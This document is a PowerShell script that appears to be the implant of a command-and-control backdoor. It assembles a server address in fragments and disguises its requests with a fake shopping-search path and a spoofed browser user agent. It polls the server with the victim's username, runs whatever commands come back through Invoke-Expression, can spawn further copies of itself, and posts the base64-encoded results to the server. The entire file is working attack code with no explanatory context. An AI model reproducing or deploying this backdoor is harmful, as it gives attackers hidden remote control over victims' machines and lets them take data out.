$h0 = "10.0."
$me = "2.4"
$p0rt= "8080"
$uri = "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
$proto = "ht"+"tp"+":/"+"/"
$h0me = $proto+$h0+$me+":"+$p0rt+$uri

$type = "ps1"
$id = Get-Random
$un = $env:username
$sleepytime = 3000

$curcmnd = '{"cmnd": ""}'
$jsObject = @{}

$useragent = "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
$checkin = "{`"type`": `"$type`", `"id`": $id, `"un`": `"$un`"}"

while ($True) {
	$serverMsg = (Invoke-WebRequest -Method Post -Uri $h0me -Body $checkin -UserAgent $useragent -UseBasicParsing).Content
	$jsondata = "{" + $serverMsg.split("{")[1].split("`n")[0]
	if($curcmnd -ne $jsondata) {
		$curcmnd = $jsondata
		# Convert json string to PS hashtable by hand ... cancer
		$jsondata.trim("{").trim("}").split(",") | foreach {
			$key = $_.split(":")[0].trim(" ")
			$key = $key.Substring(1, ($key.length)-2)
			$value = $_.split(":")[1].trim(" ")
			$value = $value.Substring(1, ($value.length)-2)
			$value = $value.Replace('\"','"')
			echo "key $key"
			echo "value $value"
			$jsObject[$key] = $value
		}
		if($jsObject['cmnd'] -eq "quit") {
			exit
		}
		elseif($jsObject['cmnd'] -eq "spawn") {
			try {
				$req = "{`"type`": `"$type`", `"id`": $id, `"un`": `"$un`", `"req`": `"spawn`"}"
				$selfdata = (Invoke-WebRequest -Method Post -Uri $h0me -Body $req -UserAgent $useragent -UseBasicParsing).Content
				$selfdata = $selfdata.replace('"','"""')
				Start-Process powershell -ArgumentList "-c $selfdata" -NoNewWindow
				$retval = "[+] Spawn success..."
			}
			catch {
				$retval = "[-] Spawn failed..."
			}
		}
		else {
			$retval = IEX $jsObject.cmnd -ErrorVariable error 2>&1
			if($error) {
				$retval = $retval + "`n[-] Errors returned:`n`n" + $error
				$error = ""
			}
		}
		if(!($retval)) {
			$retval = "[-] No results returned"
		}
		$ncoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($retval))
		$resp = "{`"type`": `"$type`", `"id`": $id, `"un`": `"$un`", `"retval`": `"$ncoded`"}"
		$null = Invoke-WebRequest -Method Post -Uri $h0me -Body $resp -UserAgent $useragent -UseBasicParsing
	}
	Start-Sleep -Milliseconds $sleepytime
}